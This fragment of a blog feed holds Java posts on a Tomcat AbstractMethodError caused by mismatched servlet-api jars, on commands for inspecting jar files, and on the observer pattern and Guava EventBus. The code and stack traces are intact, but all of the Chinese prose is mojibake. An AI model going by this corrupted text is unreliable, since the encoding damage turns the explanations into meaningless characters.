<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li>ã€ŠHow tomcat worksã€‹</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> string-manager </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcatè®¿é—®æ—¶å‘ç”ŸAbstractMethodError]]></title>
      <url>http://qsli.github.io/2017/01/27/tomcat-AbstractMethodError/</url>
      <content type="html"><![CDATA[<h2 id="å¼‚å¸¸å †æ ˆ"><a href="#å¼‚å¸¸å †æ ˆ" class="headerlink" title="å¼‚å¸¸å †æ ˆ"></a>å¼‚å¸¸å †æ ˆ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">javax.servlet.ServletException: Servlet execution threw an exception</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:313) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206) [catalina.jar:6.0.29]</span><br><span class="line">        at qunar.ServletWatcher.doFilter(ServletWatcher.java:160) ~[common-core-8.3.5.jar:na]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206) [catalina.jar:6.0.29]</span><br><span class="line">        at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:121) [spring-web-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:555) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:857) [tomcat-coyote.jar:6.0.29]</span><br><span class="line">        at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588) [tomcat-coyote.jar:6.0.29]</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489) [tomcat-coyote.jar:6.0.29]</span><br><span class="line">        at java.lang.Thread.run(Thread.java:745) [na:1.8.0_60]</span><br><span class="line">Caused by: java.lang.AbstractMethodError: null</span><br><span class="line">        at javax.servlet.http.HttpServletResponseWrapper.getStatus(HttpServletResponseWrapper.java:228) ~[lib/:na]</span><br><span class="line">        at javax.servlet.http.HttpServletResponseWrapper.getStatus(HttpServletResponseWrapper.java:228) ~[lib/:na]</span><br><span class="line">        at org.springframework.web.servlet.FrameworkServlet.publishRequestHandledEvent(FrameworkServlet.java:1070) ~[spring-webmvc-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1003) ~[spring-webmvc-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:859) ~[spring-webmvc-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at javax.servlet.http.HttpServlet.doHead(HttpServlet.java:244) ~[lib/:na]</span><br><span class="line">        at javax.servlet.http.HttpServlet.service(HttpServlet.java:644) ~[lib/:na]</span><br><span class="line">        at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:844) ~[spring-webmvc-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at javax.servlet.http.HttpServlet.service(HttpServlet.java:728) ~[lib/:na]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290) [catalina.jar:6.0.29]</span><br><span class="line">        ... 19 common frames omitted</span><br></pre></td></tr></table></figure>
<h3 id="AbstractMethodErrorå¼‚å¸¸"><a href="#AbstractMethodErrorå¼‚å¸¸" class="headerlink" title="AbstractMethodErrorå¼‚å¸¸"></a>AbstractMethodErrorå¼‚å¸¸</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Thrown when an application tries to call an abstract method.</span></span><br><span class="line"><span class="comment"> * Normally, this error is caught by the compiler; this error can</span></span><br><span class="line"><span class="comment"> * only occur at run time if the definition of some class has</span></span><br><span class="line"><span class="comment"> * incompatibly changed since the currently executing method was last</span></span><br><span class="line"><span class="comment"> * compiled.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  unascribed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   JDK1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AbstractMethodError</span> <span class="keyword">extends</span> <span class="title">IncompatibleClassChangeError</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure>
<p>å°±æ˜¯è°ƒç”¨äº†ä¸€ä¸ªæ²¡æœ‰å®ç°çš„æŠ½è±¡æ–¹æ³•æ—¶ä¼šæŠ›å‡ºè¿™ä¸ªå¼‚å¸¸ã€‚</p>
<h2 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h2><h3 id="ç¯å¢ƒè¢«æä¹±"><a href="#ç¯å¢ƒè¢«æä¹±" class="headerlink" title="ç¯å¢ƒè¢«æä¹±"></a>ç¯å¢ƒè¢«æä¹±</h3><p>æœ‰äººæŠŠ<code>servlet-api 3.0</code>çš„jaråŒ…æ‹·è´åˆ°äº†<code>tomcat6</code>çš„libç›®å½•ä¸‹ï¼Œæ›¿æ¢äº†åŸæ¥çš„jaråŒ…ï¼Œé€ æˆspringä»¥ä¸ºä»–æ”¯æŒServlet3.0 ä½†æ˜¯tomcatå´æ²¡æœ‰å®ç°è¿™ä¸ªæ–¹æ³•ã€‚</p>
<h2 id="Spring-ç‰ˆæœ¬"><a href="#Spring-ç‰ˆæœ¬" class="headerlink" title="Spring ç‰ˆæœ¬"></a>Spring ç‰ˆæœ¬</h2><p>Springçš„ç‰ˆæœ¬æ˜¯4.2.5ï¼Œå¢åŠ äº†ä¸€äº›<code>Servlet 3.0</code> çš„ç‰¹æ€§æ”¯æŒ, ä½†æ˜¯ä½¿ç”¨ä¹‹å‰Springä¼šæ ¹æ®ä½¿ç”¨çš„</p>
<p><code>Servlet-api</code>æ¥æ£€æµ‹æ˜¯å¦æ”¯æŒ<code>Servlet 3.0</code></p>
<p>ä½¿ç”¨çš„3.0çš„api</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the current status code of this response.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the current status code of this response</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Servlet 3.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getStatus</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>FrameworkServlet</code>ä¸­ä¼šè¿›è¡Œç›¸åº”çš„æ£€æµ‹å’Œä½¿ç”¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/** Checking for Servlet 3.0+ HttpServletResponse.getStatus() */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> responseGetStatusAvailable =</span><br><span class="line">            ClassUtils.hasMethod(HttpServletResponse.class, "getStatus");</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">publishRequestHandledEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HttpServletRequest request, HttpServletResponse response, <span class="keyword">long</span> startTime, Throwable failureCause)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.publishEvents) &#123;</span><br><span class="line">        <span class="comment">// Whether or not we succeeded, publish an event.</span></span><br><span class="line">        <span class="keyword">long</span> processingTime = System.currentTimeMillis() - startTime;</span><br><span class="line">        <span class="keyword">int</span> statusCode = (responseGetStatusAvailable ? response.getStatus() : -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">this</span>.webApplicationContext.publishEvent(</span><br><span class="line">            <span class="keyword">new</span> ServletRequestHandledEvent(<span class="keyword">this</span>,</span><br><span class="line">                    request.getRequestURI(), request.getRemoteAddr(),</span><br><span class="line">                    request.getMethod(), getServletConfig().getServletName(),</span><br><span class="line">                    WebUtils.getSessionId(request), getUsernameForRequest(request),</span><br><span class="line">                    processingTime, failureCause, statusCode));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ä¸ºä»€ä¹ˆç¼–è¯‘æ—¶æ²¡æœ‰æŠ¥é”™"><a href="#ä¸ºä»€ä¹ˆç¼–è¯‘æ—¶æ²¡æœ‰æŠ¥é”™" class="headerlink" title="ä¸ºä»€ä¹ˆç¼–è¯‘æ—¶æ²¡æœ‰æŠ¥é”™"></a>ä¸ºä»€ä¹ˆç¼–è¯‘æ—¶æ²¡æœ‰æŠ¥é”™</h3><blockquote>
<p>å½“å‰çš„JVMè§„èŒƒä¸­ï¼Œä¸æ–¹æ³•è°ƒç”¨ç›¸å…³çš„æŒ‡ä»¤æœ‰4ä¸ªï¼šinvokevirtualã€invokeinterfaceã€invokestaticä¸invokespecialã€‚å…¶ä¸­è°ƒç”¨æ¥å£æ–¹æ³•æ—¶ä½¿ç”¨çš„JVMæŒ‡ä»¤æ˜¯invokeinterfaceã€‚è¿™ä¸ªæŒ‡ä»¤ä¸å¦å¤–3ä¸ªæ–¹æ³•è°ƒç”¨æŒ‡ä»¤æœ‰ä¸€ä¸ªæ˜¾è‘—çš„å·®å¼‚ï¼šå®ƒä¸è¦æ±‚JVMçš„æ ¡éªŒå™¨ï¼ˆverifierï¼‰æ£€æŸ¥è¢«è°ƒç”¨å¯¹è±¡ï¼ˆreceiverï¼‰çš„ç±»å‹ï¼›å¦å¤–3ä¸ªæ–¹æ³•è°ƒç”¨æŒ‡ä»¤éƒ½è¦æ±‚æ ¡éªŒè¢«è°ƒç”¨å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨invokeinterfaceæ—¶å¦‚æœè¢«è°ƒç”¨å¯¹è±¡æ²¡æœ‰å®ç°æŒ‡å®šçš„æ¥å£ï¼Œåˆ™åº”è¯¥åœ¨è¿è¡Œæ—¶è€Œä¸æ˜¯é“¾æ¥æ—¶æŠ›å‡ºå¼‚å¸¸ï¼›è€Œå¦å¤–3ä¸ªæ–¹æ³•è°ƒç”¨æŒ‡ä»¤éƒ½è¦æ±‚åœ¨é“¾æ¥æ—¶æŠ›å‡ºå¼‚å¸¸ã€‚ </p>
</blockquote>
<p>è¿™ä¹Ÿæ˜¯ä¸ºå•¥ç±»çš„è½½å…¥æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯tomcaté‡Œé¢æ²¡æœ‰å®ç°é‚£ä¸ªæ–¹æ³•ã€‚</p>
<h2 id="servletå’Œtomcatçš„å¯¹åº”å…³ç³»"><a href="#servletå’Œtomcatçš„å¯¹åº”å…³ç³»" class="headerlink" title="servletå’Œtomcatçš„å¯¹åº”å…³ç³»"></a>servletå’Œtomcatçš„å¯¹åº”å…³ç³»</h2>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://rednaxelafx.iteye.com/blog/400362" rel="external nofollow noopener noreferrer" target="_blank">JVMåœ¨æ ¡éªŒé˜¶æ®µä¸æ£€æŸ¥æ¥å£çš„å®ç°çŠ¶å†µ - Script Ahead, Code Behind - ITeyeæŠ€æœ¯ç½‘ç«™</a></p>
</li>
<li><p><a href="http://tomcat.apache.org/whichversion.html" rel="external nofollow noopener noreferrer" target="_blank">Apache TomcatÂ® - Which Version Do I Want?</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[jaræ–‡ä»¶æŸ¥çœ‹]]></title>
      <url>http://qsli.github.io/2017/01/27/jar/</url>
      <content type="html"><![CDATA[<p>æŸ¥çœ‹jaråŒ…å†…å®¹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -q -c myarchive.jar META-INF/MANIFEST.MF</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>-q</code> will suppress verbose output from the unzip program</p>
</blockquote>
<blockquote>
<p><code>-c</code> will extract to stdout</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unzip -q -c servlet-api.jar META-INF/MANIFEST.MF</span><br><span class="line">Manifest-Version: 1.0</span><br><span class="line">Ant-Version: Apache Ant 1.8.1</span><br><span class="line">Created-By: 1.6.0_45-b06 (Sun Microsystems Inc.)</span><br><span class="line">X-Compile-Source-JDK: 1.6</span><br><span class="line">X-Compile-Target-JDK: 1.6</span><br><span class="line"></span><br><span class="line">Name: javax/servlet/</span><br><span class="line">Specification-Title: Java API for Servlets</span><br><span class="line">Specification-Version: 3.0</span><br><span class="line">Specification-Vendor: Sun Microsystems, Inc.</span><br><span class="line">Implementation-Title: javax.servlet</span><br><span class="line">Implementation-Version: 3.0.FR</span><br><span class="line">Implementation-Vendor: Apache Software Foundation</span><br></pre></td></tr></table></figure>
<h2 id="jarå‘½ä»¤"><a href="#jarå‘½ä»¤" class="headerlink" title="jarå‘½ä»¤"></a>jarå‘½ä»¤</h2><p>åœ¨linuxä¸‹å¦‚ä½•æŸ¥çœ‹ä¸€ä¸ªjaræ–‡ä»¶ä¸­æœ‰å“ªäº›ç±»å‘¢ï¼Ÿ</p>
<p><code>jar tf test.jar</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">META-INF/</span><br><span class="line">META-INF/MANIFEST.MF</span><br><span class="line">javax/</span><br><span class="line">javax/servlet/</span><br><span class="line">javax/servlet/annotation/</span><br><span class="line">javax/servlet/descriptor/</span><br><span class="line">javax/servlet/http/</span><br><span class="line">...</span><br><span class="line">javax/servlet/resources/xml.xsd</span><br><span class="line">META-INF/NOTICE</span><br><span class="line">META-INF/LICENSE</span><br></pre></td></tr></table></figure>
<h2 id="grepjar"><a href="#grepjar" class="headerlink" title="grepjar"></a>grepjar</h2><p>æœ‰äº›æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥çœ‹ä¸€ä¸ªjaræ–‡ä»¶ä¸­æ˜¯å¦åŒ…å«äº†æŸä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªåœ¨linuxä¸‹å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æ¥æŸ¥è¯¢</p>
<p><code>grepjar methodName class.jar</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ grepjar <span class="string">'getStatus'</span> servlet-api.jar</span><br><span class="line">javax/servlet/http/HttpServletResponse.class:getStatus</span><br><span class="line">javax/servlet/http/HttpServletResponseWrapper.class:getStatus</span><br></pre></td></tr></table></figure>
<p>å‚æ•°ï¼š</p>
<p>||option || meaning ||<br>|-b |  Print byte offset of match.|<br>|â€“|â€”â€”â€”â€”â€”|<br>|-c |  Print number of matches.|<br>|-i |  Compare case-insensitively.|<br>|-n |  Print line number of each match.|<br>|-s |  Suppress error messages.|<br>|-w |  Force PATTERN to match only whole words.|<br>|-e | PATTERN  Use PATTERN as regular expression.|<br>|â€“help |  Print help, then exit.|<br>|-V |  |<br>|â€“version |   Print version number, then exit.|</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://stackoverflow.com/questions/7066063/how-to-read-manifest-mf-file-from-jar-using-bash" rel="external nofollow noopener noreferrer" target="_blank">How to read MANIFEST.MF file from JAR using Bash - Stack Overflow</a></p>
<p><a href="http://xiaofengwu.tumblr.com/post/63518704051/linux%E6%9F%A5%E7%9C%8Bjar%E4%B8%AD%E7%9A%84%E7%B1%BB%E4%BB%A5%E5%8F%8A%E7%B1%BB%E4%B8%AD%E6%96%B9%E6%B3%95%E5%91%BD%E4%BB%A4" rel="external nofollow noopener noreferrer" target="_blank">å´å³°å­ â€” linuxæŸ¥çœ‹jarä¸­çš„ç±»ä»¥åŠç±»ä¸­æ–¹æ³•å‘½ä»¤</a></p>
<p><a href="http://www.tutorialspoint.com/unix_commands/grepjar.htm" rel="external nofollow noopener noreferrer" target="_blank">grepdiff - Unix, Linux Command</a></p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jar </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[guava-eventbus]]></title>
      <url>http://qsli.github.io/2017/01/17/guava-eventbus/</url>
      <content type="html"><![CDATA[<h2 id="ä»è§‚å¯Ÿè€…æ¨¡å¼è¯´èµ·"><a href="#ä»è§‚å¯Ÿè€…æ¨¡å¼è¯´èµ·" class="headerlink" title="ä»è§‚å¯Ÿè€…æ¨¡å¼è¯´èµ·"></a>ä»è§‚å¯Ÿè€…æ¨¡å¼è¯´èµ·</h2><h3 id="è§‚å¯Ÿè€…æ¨¡å¼ç±»å›¾"><a href="#è§‚å¯Ÿè€…æ¨¡å¼ç±»å›¾" class="headerlink" title="è§‚å¯Ÿè€…æ¨¡å¼ç±»å›¾"></a>è§‚å¯Ÿè€…æ¨¡å¼ç±»å›¾</h3><p>è§‚å¯Ÿè€…æ¨¡å¼æ˜¯è½¯ä»¶è®¾è®¡ä¸­ç»å¸¸ä½¿ç”¨åˆ°çš„ä¸€ç§æ¨¡å¼ï¼Œåˆå«å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼ˆPublish/Subscribeï¼‰ã€æ¨¡å‹-è§†å›¾(Model/View)æ¨¡å¼ã€æº-ç›‘å¬å™¨ï¼ˆSource/Listenerï¼‰æ¨¡å¼æˆ–ä»å±è€…ï¼ˆDependentsï¼‰æ¨¡å¼ã€‚</p>
<img src="http://www.plantuml.com/plantuml/svg/ZL1B3e8m4Dtt51FSWCe5Z36X7825I-C2w4XGqffIJOnwTm5f1IdYRlBcVMOUESVfASuGoajon5JT2O1e9jY-4QYX1N2XyiCjIagKLvIbwpLep9Y6MeHXWGfxu9DyJ4F1KraHMlDWtFo7YawezENhX-yF4YVsb5GMkXJHUdTQYJgGFc6OB2fZP-uODgp0DNCeYg8YvO9xbXyrBR0dZB2fdMqoUw-QY4a69NKTtnM2lvjb4f4lcL0AsNvZiHw8_b1HyW80">
<h3 id="Javaä¸­çš„æ”¯æŒ"><a href="#Javaä¸­çš„æ”¯æŒ" class="headerlink" title="Javaä¸­çš„æ”¯æŒ"></a>Javaä¸­çš„æ”¯æŒ</h3><p>Javaä¸­æœ‰ä¸€ä¸ª<code>Observable</code>ç±»å’Œä¸€ä¸ª<code>Observer</code>æ¥å£, <code>Observable</code>ç±»å·²ç»å®ç°äº†æ·»åŠ ã€åˆ é™¤è§‚å¯Ÿè€…çš„æ–¹æ³•ã€‚</p>
<ul>
<li>ä¸»é¢˜ç»§æ‰¿è‡ª<code>Observable</code>ï¼Œç»§æ‰¿ä¸€äº›ä¾¿åˆ©æ–¹æ³•</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Subject</span> <span class="keyword">extends</span> <span class="title">Observable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String subject = <span class="string">"play with some fun"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        notifyObservers(message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSubject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> subject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Subject subject = <span class="keyword">new</span> Subject();</span><br><span class="line">        subject.addObserver(<span class="keyword">new</span> Watcher(<span class="string">"001"</span>));</span><br><span class="line">        subject.addObserver(<span class="keyword">new</span> Watcher(<span class="string">"007"</span>));</span><br><span class="line">        subject.setChanged();</span><br><span class="line">        <span class="comment">//will do nothing until setChanged() is called</span></span><br><span class="line">        subject.push(<span class="string">"My watch is ended!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>è§‚å¯Ÿè€…ç»§æ‰¿<code>Observer</code>æ¥å£ï¼Œåªæœ‰ä¸€ä¸ª<code>update</code>æ–¹æ³•ç”¨æ¥æ›´æ–°æ•°æ®</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Watcher</span> <span class="keyword">implements</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Watcher</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        System.out.println(<span class="string">"My watch begins! "</span> + id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(Observable o, Object arg)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------------------------"</span>);</span><br><span class="line">        System.out.println(id);</span><br><span class="line">        Subject subject = (Subject) o;</span><br><span class="line">        System.out.println(<span class="string">"subject is : "</span> + subject.getSubject());</span><br><span class="line">        System.out.println(<span class="string">"update data is : "</span> + (String)arg );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">My watch begins! 001</span><br><span class="line">My watch begins! 007</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">007</span><br><span class="line">subject is : play with some fun</span><br><span class="line">update data is : My watch is ended!</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">001</span><br><span class="line">subject is : play with some fun</span><br><span class="line">update data is : My watch is ended!</span><br></pre></td></tr></table></figure>
<h3 id="EventBus"><a href="#EventBus" class="headerlink" title="EventBus"></a>EventBus</h3><blockquote>
<p>EventBus allows publish-subscribe-style communication between components without requiring the components to explicitly register with one another (and thus be aware of each other). It is designed exclusively to replace traditional Java in-process event distribution using explicit registration. It is not a general-purpose publish-subscribe system, nor is it intended for interprocess communication.</p>
</blockquote>
<p>EventBusçš„ä¼˜ç‚¹ï¼š</p>
<ul>
<li>æ— éœ€å®šä¹‰æ¥å£ï¼Œä½¿ç”¨æ³¨è§£çš„å½¢å¼ã€‚</li>
<li>å¯ä»¥åœ¨ä¸€ä¸ªç±»ä¸­å®ç°å¤šä¸ªäº‹ä»¶çš„æ•è·ã€‚</li>
</ul>
<blockquote>
<p>Due to erasure, no single class can implement a generic interface more than once with different type parameters. </p>
</blockquote>
<ul>
<li>æ”¯æŒå­ç±»çš„æ•è·ã€‚</li>
<li>æ”¯æŒæ•è·æ— äººå¤„ç†çš„eventï¼ˆè®©æˆ‘æƒ³èµ·äº†æ­»æ¼‚ï¼‰ã€‚</li>
<li>ä¼ é€’çš„äº‹ä»¶ç±»å‹å¯ä»¥æ˜¯ä»»æ„çš„ã€‚</li>
</ul>
